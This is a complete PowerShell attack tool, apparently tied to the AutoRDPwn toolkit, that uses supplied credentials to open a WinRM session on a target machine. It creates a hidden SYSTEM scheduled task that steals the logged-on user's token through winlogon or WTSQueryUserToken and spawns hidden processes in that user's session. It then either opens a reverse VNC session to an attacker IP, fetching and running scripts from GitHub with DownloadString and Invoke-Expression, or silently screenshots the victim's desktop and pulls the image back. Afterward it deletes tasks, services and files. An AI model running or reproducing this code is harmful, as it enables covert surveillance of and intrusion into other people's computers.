function Invoke-StealthScreen {
    Param(
        [Parameter(Mandatory)] $Target,
        [Parameter(Mandatory)] $User,
        [Parameter(Mandatory)] $Pass,
        $Mode = 'view',
        $AttackerIP,
        $Port = 5500,
        $Password = 'AutoRDPw',
        $Path = 'C:\Windows\Temp'
    )

    $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $sec)
    $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
    if (!$s) { Write-Host "[!] WinRM session failed" -ForegroundColor Red; return }

    $cs = @'
using System;
using System.Runtime.InteropServices;
public class WTS {
    [DllImport("kernel32.dll")] public static extern UInt32 WTSGetActiveConsoleSessionId();
    [DllImport("wtsapi32.dll", SetLastError=true)] public static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr Token);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool CreateProcessAsUserW(IntPtr hToken, IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInformation);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize;
        public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags;
        public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
}
'@

    if ($Mode -eq 'view') {
        if (!$AttackerIP) { Write-Host "[!] -AttackerIP required for view mode" -ForegroundColor Red; Remove-PSSession $s; return }

        $viewer = Get-Process VNCViewer -ErrorAction SilentlyContinue
        if (!$viewer) {
            $scriptdir = $PSScriptRoot
            Push-Location $env:TEMP
            try {
                if ($scriptdir -and (Test-Path (Join-Path $scriptdir 'Invoke-VNCViewer.ps1'))) {
                    & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1')
                } else {
                    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
                }
            } finally { Pop-Location }
            Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
            Start-Sleep -Seconds 3
        }
        Write-Host "[+] Handler on ${AttackerIP}:$Port - spawning hidden server on target console session" -ForegroundColor Blue

        $vncps = Get-Content (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1') -Raw -ErrorAction SilentlyContinue
        if (!$vncps) { $vncps = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1') }
        $vncps = "function L2 { Param(`$m) Add-Content -Path 'C:\Windows\Temp\vnclog.txt' -Value `$m }`r`nL2 'VNC SCRIPT STARTING'`r`n" + $vncps
        $vncps += "`r`nL2 'INVOKING REVERSE VNC'`r`ntry { Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password; L2 'VNC RETURNED CLEAN' } catch { L2 ('VNC ERR: ' + `$_.Exception.Message) }`r`n"
        $vb64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($vncps))

        $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
"try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
"Set-Content -Path 'C:\Windows\Temp\vnc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$vb64'))) -Force`n" +
"try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
"} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
"`$sessId = [WTS]::WTSGetActiveConsoleSessionId()`n" +
"L (`"SESS: `" + `$sessId)`n" +
"`$tok = [IntPtr]::Zero`n" +
"`$q = `$false`n" +
"try { `$q = [WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok); L (`"QT RETURNED: `" + `$q + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } catch { L (`"QT THREW: `" + `$_.Exception.Message) }`n" +
"if (`$q) { L ('USERTOKEN OK TOKEN=' + `$tok.ToString() + ' ZERO=' + (`$tok -eq [IntPtr]::Zero)); `$dup = [IntPtr]::Zero; `$dr = [WTS]::DuplicateTokenEx(`$tok, 0x18B, [IntPtr]::Zero, 2, 1, [ref]`$dup); L ('DUP ' + `$dr + ' ERR ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error() + ' NEWTOK=' + `$dup.ToString()); if (`$dr) { `$tok = `$dup } } else {`n" +
"    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1`n" +
"    if (`$wl) { L (`"WINLOGON FOUND PID `" + `$wl.Id)`n" +
"        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)`n" +
"        L (`"OPENPROC ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
"        if (`$h -ne [IntPtr]::Zero) {`n" +
"            `$r = [WTS]::OpenProcessToken(`$h, 0x18B, [ref]`$tok)`n" +
"            L (`"OPENTOKEN `" + `$r + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
"        }`n" +
"    } else { L 'NO WINLOGON IN SESSION' }`n" +
"}`n" +
"`$si = New-Object WTS+STARTUPINFO`n" +
"`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
"`$si.lpDesktop = 'WinSta0\Default'`n" +
"`$cmdline = 'powershell.exe -nop -w hidden -f C:\Windows\Temp\vnc.ps1'`n" +
"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
"`$ptrSi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf(`$si))`n" +
"[System.Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)`n" +
"`$ptrPi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)`n" +
"[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0), 0, `$ptrPi, 24)`n" +
"`$cp = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmdline)`n" +
"`$ok = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)`n" +
"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + [System.Runtime.InteropServices.Marshal]::ReadInt32(`$ptrPi, 16)) }`n"

        $sb = [scriptblock]::Create($engine)
        invoke-command -session $s -scriptblock {
            Param($et)
            Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue
            Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
            Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
            Start-ScheduledTask -TaskName 'WinSS' -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 22
        } -ArgumentList $engine
        Start-Sleep -Seconds 18
        invoke-command -session $s -scriptblock {
            Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
            sc.exe stop WinShotSvc | Out-Null; sc.exe stop WinSessionSvc | Out-Null
            sc.exe delete WinShotSvc | Out-Null; sc.exe delete WinSessionSvc | Out-Null
            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
            'SSLOG:'
            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
            'VNCLOG:'
            if (Test-Path 'C:\Windows\Temp\vnclog.txt') { Get-Content 'C:\Windows\Temp\vnclog.txt' } else { 'NO VNCLOG' }
        }
    }

    if ($Mode -eq 'shot') {
        Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue

        $cmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
               "New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; " +
               "`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
               "`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; " +
               "`$g = [System.Drawing.Graphics]::FromImage(`$bmp); " +
               "`$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); " +
               "`$bmp.Save('$Path\shota.png'); " +
               "`$g.Dispose(); `$bmp.Dispose()"
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
        $enc = [System.Convert]::ToBase64String($bytes)

        $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
"try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
"Set-Content -Path 'C:\Windows\Temp\shotc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$enc'))) -Force`n" +
"try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
"} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
"`$sessId = [WTS]::WTSGetActiveConsoleSessionId()`n" +
"L (`"SESS: `" + `$sessId)`n" +
"`$tok = [IntPtr]::Zero`n" +
"`$q = `$false`n" +
"try { `$q = [WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok); L (`"QT RETURNED: `" + `$q + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } catch { L (`"QT THREW: `" + `$_.Exception.Message) }`n" +
"if (`$q) { L ('USERTOKEN OK TOKEN=' + `$tok.ToString() + ' ZERO=' + (`$tok -eq [IntPtr]::Zero)); `$dup = [IntPtr]::Zero; `$dr = [WTS]::DuplicateTokenEx(`$tok, 0x18B, [IntPtr]::Zero, 2, 1, [ref]`$dup); L ('DUP ' + `$dr + ' ERR ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error() + ' NEWTOK=' + `$dup.ToString()); if (`$dr) { `$tok = `$dup } } else {`n" +
"    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1`n" +
"    if (`$wl) { L (`"WINLOGON FOUND PID `" + `$wl.Id)`n" +
"        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)`n" +
"        L (`"OPENPROC ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
"        if (`$h -ne [IntPtr]::Zero) {`n" +
"            `$r = [WTS]::OpenProcessToken(`$h, 0x18B, [ref]`$tok)`n" +
"            L (`"OPENTOKEN `" + `$r + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
"        }`n" +
"    } else { L 'NO WINLOGON IN SESSION' }`n" +
"}`n" +
"`$si = New-Object WTS+STARTUPINFO`n" +
"`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
"`$si.lpDesktop = 'WinSta0\Default'`n" +
"`$cmdline = 'powershell.exe -nop -w hidden -e ' + '$enc'`n" +
"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
"`$ptrSi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf(`$si))`n" +
"[System.Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)`n" +
"`$ptrPi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)`n" +
"[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0), 0, `$ptrPi, 24)`n" +
"`$cp = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmdline)`n" +
"`$ok = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)`n" +
"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + [System.Runtime.InteropServices.Marshal]::ReadInt32(`$ptrPi, 16)) }`n" +
"Start-Sleep -Seconds 12"

        $sb = [scriptblock]::Create($engine)
        invoke-command -session $s -scriptblock {
            Param($et, $engineSb)
            Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue
            Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
            Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
            Start-ScheduledTask -TaskName 'WinSS' -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 26
            Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
            'LOG:'
            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
            'FILE:'
            if (Test-Path 'C:\Windows\Temp\shota.png') { "SHOTFILE $((Get-Item 'C:\Windows\Temp\shota.png').Length) bytes" } else { 'NOFILE' }
            'SSPS1:'
            if (Test-Path 'C:\Windows\Temp\ss.ps1') { Get-Content 'C:\Windows\Temp\ss.ps1' | Select-Object -First 40 } else { 'NO SSPS1' }
        } -ArgumentList $engine, $sb
        Write-Host "[i] result above"

        $res = invoke-command -session $s -scriptblock {
            if (Test-Path 'C:\Windows\Temp\shota.png') {
                [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\shota.png'))
            }
        }
        if ($res) {
            [IO.File]::WriteAllBytes("$env:TEMP\stealthshot.png", [Convert]::FromBase64String($res))
            Write-Host "[+] Screen captured: $env:TEMP\stealthshot.png" -ForegroundColor Green
            Invoke-Item "$env:TEMP\stealthshot.png"
        } else {
            Write-Host "[!] No screenshot arrived" -ForegroundColor Red
        }
    }

    Remove-PSSession $s
}
